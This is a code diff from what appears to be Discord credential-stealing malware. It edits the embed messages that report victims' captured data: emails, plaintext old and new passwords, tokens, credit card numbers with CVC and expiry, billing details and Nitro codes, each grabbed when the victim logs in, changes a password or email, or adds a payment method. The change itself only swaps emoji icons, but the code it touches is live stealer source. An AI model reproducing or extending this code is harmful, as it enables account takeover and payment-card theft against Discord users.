@@ -663,12 +663,12 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info:**',
-            value: `<:Phone:1080852884696076379> **Email:** **${email}** - 🔒 **Password:** **${password}**`,
+            value: `<:Phone:1080852884696076379> **Email:** **${email}** - <:password:1080903595345584138> **Password:** **${password}**`,
             inline: false,
           },
           {
             name: '**Discord Info:**',
-            value: `🚀 **Nitro Type:** **${nitro}**\n 🎖️ **Badges:** **${badges}**\n 💵 **Billing:** **${billing}**`,
+            value: `<:nitrotype:1080905103810252870> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
             inline: false,
           },
           {
@@ -702,12 +702,12 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `📧 **Email:** **${json.email}**\n🔓 **Old Password:** **${oldpassword}**0\n 🔒 **New Password:** **${newpassword}**`,
+            value: `<:Phone:1080852884696076379> **Email:** **${json.email}**\n <:password:1080903595345584138> **Old Password:** **${oldpassword}**0\n <:password:1080903595345584138> **New Password:** **${newpassword}**`,
             inline: true,
           },
           {
             name: '**Discord Info:**',
-            value: `🚀 **Nitro Type:** **${nitro}**\n🎖️ **Badges:** **${badges}**\n💵 **Billing:** **${billing}**`,
+            value: `<:nitrotype:1080905103810252870> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
             inline: true,
           },
           {
@@ -741,12 +741,12 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `📧 **New Email:** **${email}**\n🔒 **Password:** **${password}**`,
+            value: `<:Phone:1080852884696076379> **New Email:** **${email}**\n <:password:1080903595345584138> **Password:** **${password}**`,
             inline: true,
           },
           {
             name: '**Discord Info:**',
-            value: `🚀 **Nitro Type:** **${nitro}**\n 🎖️ **Badges:** **${badges}**\n💵 **Billing:** **${billing}**`,
+            value: `<:nitrotype:1080905103810252870> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
             inline: true,
           },
           {
@@ -785,7 +785,7 @@ const PaypalAdded = async (token) => {
           },
           {
             name: '**Discord Info:**',
-            value: `🚀 **Nitro Type:** **{nitro}**\n 🎖️ **Badges:** **${badges}**\n💵 **Billing:** **${billing}**`,
+            value: `<:nitrotype:1080905103810252870> **Nitro Type:** **{nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
             inline: false,
           },
           {
@@ -824,7 +824,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           },
           {
             name: '**Discord Info**',
-            value: `🚀 **Nitro Type:** **${nitro}**\n 🎖️ **Badges:** **${badges}**\n💵 **Billing:** **${billing}**`,
+            value: `<:nitrotype:1080905103810252870> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
             inline: true,
           },
           {
@@ -860,12 +860,12 @@ const nitroBought = async (token) => {
         fields: [
           {
             name: '**Nitro bought!**',
-            value: `🚀 **Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            value: `<:nitrotype:1080905103810252870> **Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
           {
             name: '**Discord Info**',
-            value: `🚀 **Nitro Type:** **${nitro}**\n 🎖️ **Badges:** **${badges}**\n💵 **Billing:** **${billing}**`,
+            value: `<:nitrotype:1080905103810252870> **Nitro Type:** **${nitro}**\n <:badge:1080881734821871626> **Badges:** **${badges}**\n <:Billing:1080850651023687791> **Billing:** **${billing}**`,
             inline: true,
           },
           {
